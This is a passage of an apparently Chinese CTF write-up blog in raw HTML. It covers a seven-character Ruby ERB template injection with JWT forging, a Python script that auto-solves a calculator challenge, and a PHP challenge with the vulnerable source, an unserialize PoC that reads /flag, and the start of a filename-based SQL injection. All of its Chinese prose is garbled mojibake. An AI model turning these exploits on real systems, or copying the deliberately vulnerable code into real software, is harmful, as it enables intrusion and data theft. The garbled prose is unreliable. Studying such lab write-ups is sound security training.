class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>ifæˆç«‹åˆ™ä¼šå¼¹å‡ºnameå‚æ•°çš„å‰ä¸ƒä¸ªå­—ç¬¦å€¼ï¼Œè¿™é‡Œå°±é™åˆ¶äº†ä¸ƒå­—ç¬¦çš„æ¨¡æ¿æ³¨å…¥ï¼Œerbæ¨¡æ¿çš„æ³¨å…¥æ ¼å¼ä¸º<code>&lt;%=%&gt;</code>ï¼Œæ˜¾ç„¶è¿™é‡Œå°±å äº†äº”ä¸ªå­—ç¬¦äº†é‚£ä¹ˆæˆ‘ä»¬å¯æ§çš„å°±åªæœ‰ä¸¤ä¸ªå­—ç¬¦ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨rubyçš„<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">é¢„å®šä¹‰å…¨å±€å˜é‡</a> <code>$&#39;</code>ï¼Œå³ä¼šè¿”å›ä¸Šæ¬¡æˆåŠŸåŒ¹é…å³å€¼çš„å­—ç¬¦ä¸²ã€‚</p><blockquote><p>$â€™</p><p>The string to the right of the last successful match.</p></blockquote><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210810113513038.png"></p><p>tipsï¼šç‰¹æ®Šå­—ç¬¦éœ€è¦urlencode</p><p>æœ‰ç§˜é’¥äº†å°±ç›´æ¥<a href="https://jwt.io/">JWT</a>ä¸€æŠŠæ¢­ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210810113831546.png"></p><p>flag_here</p><blockquote><p>flag{845aa3fa-8612-4c76-8f81-d6aa00f46882}</p></blockquote><h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>å¤§æ•°å­—è®¡ç®—å™¨ï¼Œå†™ä¸ªè„šæœ¬è‡ªåŠ¨ç®—å°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate</span>(<span class="params">n1, sl, n2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;+&#x27;</span> <span class="keyword">in</span> sl:</span><br><span class="line">        <span class="keyword">return</span> n1 + n2</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">in</span> sl:</span><br><span class="line">        <span class="keyword">return</span> n1 - n2</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">in</span> sl:</span><br><span class="line">        <span class="keyword">return</span> n1 * n2</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> sl:</span><br><span class="line">        <span class="keyword">return</span> n1 / n2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a3187c44-2492-4ad0-aac5-3bfbd8ad2de4.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">res = s.get(url=url)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1005</span>):</span><br><span class="line">    char = re.search(<span class="string">r&#x27;&gt;&lt;br&gt;(\d*)(\D*)(\d*)&lt;br&gt;&lt;br&gt;&lt;form&#x27;</span>, res.text)</span><br><span class="line">    num1 = <span class="built_in">int</span>(char.group(<span class="number">1</span>))</span><br><span class="line">    num2 = <span class="built_in">int</span>(char.group(<span class="number">3</span>))</span><br><span class="line">    symbol = char.group(<span class="number">2</span>)</span><br><span class="line">    result = calculate(num1, symbol, num2)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;answer&quot;</span>: result</span><br><span class="line">    &#125;</span><br><span class="line">    res = s.post(url=url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">f&quot;[+]Now is:<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>flag{b387e80e-8d04-454e-b5b4-720d176c82ba}</p></blockquote><h2 id="å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "><a href="#å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "></a>[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h2><p>indexæœ€ä¸‹é¢å¯ä»¥çœ‹åˆ°ä¸€æ®µè¯ã€‚</p><blockquote><p>Hello, my colleague.</p><p>Some of the features on our website have not been completed. I have uploaded the source code to github. When you have time, remember to continue.</p></blockquote><p>æç¤ºå¯ä»¥å»åˆ°ä½œè€…çš„githubä»“åº“ä¸­æ‰¾åˆ°æºç ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210812104433141.png"></p><p>ä¸‹è½½æºç ä¸‹æ¥ä»£ç å®¡è®¡ï¼Œä¸»è¦æ˜¯show.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./helper.php&quot;</span>);</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> show();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;delete_all&quot;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;delete_all&quot;</span>] == <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$show</span>-&gt;Delete_All_Images();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$show</span>-&gt;Get_All_Images();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$con</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;con = mysqli_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (mysqli_connect_errno(<span class="keyword">$this</span>-&gt;con))&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="keyword">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc())&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">                    <span class="variable">$attr_temp</span> = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line">                    <span class="variable">$attr</span> = unserialize(<span class="variable">$attr_temp</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Delete_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;DELETE FROM images&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="keyword">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å’Œhelper.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$folder</span> = <span class="string">&quot;pic/&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ifview</span> = <span class="literal">False</span>; </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;config.txt&quot;</span>;</span><br><span class="line">    <span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;file&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$fileinfo</span> = <span class="keyword">$this</span>-&gt;getfile(<span class="variable">$input</span>);</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;title&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;filename&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;ext&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;ext&#x27;</span>];</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;path&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_ext</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="variable">$input</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$my_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;width&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">0</span>],<span class="string">&quot;height&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$array</span>[<span class="string">&quot;attr&quot;</span>] = serialize(<span class="variable">$my_ext</span>);</span><br><span class="line">        <span class="variable">$id</span> = <span class="keyword">$this</span>-&gt;save(<span class="variable">$array</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="subst">$id</span>.&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">            <span class="variable">$rs</span> = <span class="keyword">$this</span>-&gt;check(<span class="variable">$_FILES</span>[<span class="variable">$input</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$rs</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$basename</span> = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$info</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$ext</span> = substr(strrchr(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$cate_exts</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$ext</span>,<span class="variable">$cate_exts</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$title</span> = str_replace(<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;title&#x27;</span>=&gt;<span class="variable">$title</span>,<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="variable">$ext</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="keyword">$this</span>-&gt;folder.<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data</span> || !is_array(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$id</span> = <span class="keyword">$this</span>-&gt;insert_array(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable">$con</span> = mysqli_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (mysqli_connect_errno(<span class="variable">$con</span>)) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql_fields</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$sql_val</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="variable">$key_temp</span> = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line">            <span class="variable">$value_temp</span> = str_replace(chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">            <span class="variable">$sql_fields</span>[] = <span class="string">&quot;`&quot;</span>.<span class="variable">$key_temp</span>.<span class="string">&quot;`&quot;</span>;</span><br><span class="line">            <span class="variable">$sql_val</span>[] = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$value_temp</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_fields</span>)).<span class="string">&quot;) VALUES(&quot;</span>.(implode(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_val</span>)).<span class="string">&quot;)&quot;</span>;</span><br><span class="line">        mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$id</span> = mysqli_insert_id(<span class="variable">$con</span>);</span><br><span class="line">        mysqli_close(<span class="variable">$con</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="literal">False</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">            <span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment"># Read some config html</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°view_filesæ–¹æ³•ä¸­file_get_contentsï¼Œå¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œè€Œshow.phpä¸­å­˜åœ¨unserializeï¼Œé‚£ä¹ˆå°±å¯ä»¥è¿›è¡Œååºåˆ—åŒ–è¯»å–æ–‡ä»¶ã€‚</p><h3 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h3><p>æ„é€ poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ifview</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> bin2hex(serialize(<span class="variable">$x</span>));</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨åå…­è¿›åˆ¶ç¼–ç æ˜¯ä¸ºäº†ç»•è¿‡protectedã€‚</p><h3 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h3><p>ååºåˆ—åŒ–æ„é€ å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯çœ‹çœ‹å¦‚ä½•åˆ°è¾¾å…¥å£ã€‚</p><p>ä»show.phpä¸­å¯ä»¥çœ‹å‡ºï¼Œå…¥å£æ˜¯sqlè¯»å–çš„attré”®å€¼ï¼Œè€Œæˆ‘ä»¬åœ¨ä¸Šä¼ æ—¶ä¼šç»è¿‡ä¸€ä¸ªcheck()å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$basename</span> = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$info</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$ext</span> = substr(strrchr(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$cate_exts</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$ext</span>,<span class="variable">$cate_exts</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$title</span> = str_replace(<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;title&#x27;</span>=&gt;<span class="variable">$title</span>,<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="variable">$ext</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="keyword">$this</span>-&gt;folder.<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬åªæœ‰$filenameå¯æ§ï¼Œè€Œ$titleçš„å€¼ä¸ºä¸Šä¼ çš„æ–‡ä»¶åå»æ‰åç¼€çš„å€¼ï¼Œå³ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶åä¸ºa.pngï¼Œåˆ™titleä¸ºaã€‚</p><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶titleæ—¶åé¢çš„è¯­å¥å¤±æ•ˆï¼Œä»è€Œè¾¾åˆ°æ§åˆ¶å˜é‡çš„ç›®çš„ï¼Œè¿™æ ·attrçš„é”®å€¼å°±å¯æ§äº†ã€‚</p><p>ä¿®æ”¹æ–‡ä»¶åä¸Šä¼ 